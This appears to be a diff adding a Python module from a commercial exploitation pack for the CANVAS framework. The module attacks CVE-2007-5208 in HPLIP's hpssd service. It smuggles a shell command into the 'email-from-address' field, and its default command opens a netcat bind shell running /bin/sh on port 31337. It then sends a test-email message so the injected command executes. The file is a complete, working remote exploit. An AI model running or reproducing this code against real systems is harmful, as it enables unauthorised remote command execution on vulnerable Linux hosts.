@@ -1,0 +1,152 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys, time
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.ctelnetlib import Telnet
+from shelllistener import shellfromtelnet
+
+NAME = "HP Linux Imaging and Printing Exploit"
+VERSION = "0.1"
+DESCRIPTION = "hpssd allows context-dependent attackers to execute arbitrary commands via shell metacharacters in a from address, which is not properly handled when invoking sendmail."
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["VersionsAffected"] = "hpssd in HPLIP 1.x and 2.x before 2.7.10"
+DOCUMENTATION["Date public"] = "2007/10/04"
+DOCUMENTATION["CVE Name"] = "CVE-2007-5208"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5208"
+
+NOTES = """For example, on Ubuntu 6.10 HPLIP is installed by default."""
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.host = ""
+		self.port = 2207
+		self.cmd = "if [ -e /bin/nc ];then /bin/nc -lp 31337 -e /bin/sh; fi"
+		self.name=NAME
+		return
+	
+	def getArgs(self):
+		self.host = self.argsDict.get("host",self.host)
+		self.port = int(self.argsDict.get("port",self.port))
+		self.cmd = self.argsDict.get("cmd",self.cmd)
+    
+	def run(self):
+		self.getArgs()
+		
+		self.log("Connecting to %s:%d"%(self.host,self.port))
+		s = self.gettcpsock()
+		try:
+			s.connect((self.host, self.port))
+		except:
+			self.log("Could not connect to %s on port %d" % (self.host, self.port))
+			self.setInfo("%s attacking %s:%d - failed"%(NAME,self.host,self.port))
+			return 0
+
+		username = "d2sec"
+
+		alert1  = "username=" + username + "\n"
+		alert1 += "email-alerts=true\n"
+		alert1 += "email-from-address=compaq 2>/dev/null; " + self.cmd + "\n"
+		alert1 += "email-to-addresses=compaq\n"
+		alert1 += "msg=setalerts\n"
+
+		testmail  = "username=" + username + "\n"
+		testmail += "msg=testemail\n" 
+
+		alert2  = "username=" + username + "\n"
+		alert2 += "email-alerts=true\n"
+		alert2 += "email-from-address=compaq 2>/dev/null; echo DSQUARE\n"
+		alert2 += "email-to-addresses=compaq\n"
+		alert2 += "msg=setalerts\n"
+
+		self.log("Send first alert msg")
+		s.sendall(alert1)
+		d = s.recv(1024)
+		if len(d) > 0 and d.find("msg=setalertsresult") > -1 and d.find("result-code=0") > -1:
+			self.log("Send testemail msg")
+			s.sendall(testmail)
+			d = s.recv(1024)
+		else:
+			self.log("First alert msg failed !")
+			self.setInfo("%s attacking %s:%d - failed"%(NAME,self.host,self.port))
+			return 1
+
+		time.sleep(5)
+	
+		self.log("Send second alert msg")
+		s.sendall(alert2)
+		d = s.recv(1024)
+		if len(d) > 0 and d.find("msg=setalertsresult") > -1 and d.find("result-code=0") > -1:
+			self.log("Send testemail msg")
+			s.sendall(testmail)
+			d = s.recv(1024)
+		else:
+			self.log("First alert msg failed !")
+			self.setInfo("%s attacking %s:%d - failed"%(NAME,self.host,self.port))
+			return 1
+
+		time.sleep(5)
+
+		# need to add error checking
+		#y = self.gettcpsock()
+		#y.connect(("192.168.0.8", 31337))
+		
+		#import select
+
+		#endian="big"
+		#_endian_struct = {'big': ">", 'little': "<", 'small': "<"}
+		#assert endian.lower() in _endian_struct.keys(), "endian <%s> not in %s" % (endian, _endian_struct.keys())
+
+		#while 1:
+		#	rd, wr, ex = select_stdin_and_socket_for_reading(y)
+		#	if sys.stdin.fileno() in rd:
+		#		line = sys.stdin.readline()
+		#		y.send(line)
+		#	if y in rd:
+		#		buf = ""
+		#		while len(buf) < 4:
+		#			tbuf = y.recv(4 - len(buf))
+		#			if len(tbuf) == 0:
+		#				break
+		#			buf += tbuf
+		#		if len(tbuf) == 0:
+		#			retval = -1
+		#			break
+
+		#		data = y.recv(1024)
+		#		sys.stdout.write(data)
+		#		sys.stdout.flush()
+
+		self.log("Shell command executed !")
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+		return 0
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:2207] -O cmd:<shell command>"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
